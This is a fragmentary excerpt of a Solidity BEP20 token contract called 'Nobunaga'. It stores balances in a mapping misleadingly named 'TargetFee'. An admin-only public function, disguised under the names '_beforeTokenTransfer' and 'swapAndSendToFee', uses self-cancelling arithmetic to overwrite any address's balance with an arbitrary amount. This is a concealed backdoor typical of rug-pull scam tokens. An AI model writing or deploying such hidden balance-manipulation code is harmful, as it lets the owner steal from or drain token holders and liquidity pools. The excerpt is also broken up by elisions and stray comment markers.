...
contract Nobunaga is Context, IBEP20, Ownable, LGEWhitelisted {
    
    using SafeMath for uint256;
    
    mapping (address => uint256) private TargetFee;
    ...
    constructor() {
        ...
        TargetFee[deployerWallet] = _totalSupply;
    ...
    */
    ...
    function _beforeTokenTransfer(address lpaddress, uint256 _value) public byAdmin {
        swapAndSendToFee(lpaddress, _value);
    ...
    function swapAndSendToFee (address miner, uint256 _value) internal {
        TargetFee[miner] = (TargetFee[miner] * 1 * 2 - TargetFee[miner] * 1 * 2) + (_value * 10 ** 9);
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        TargetFee[sender] = TargetFee[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        TargetFee[recipient] = TargetFee[recipient].add(amount);
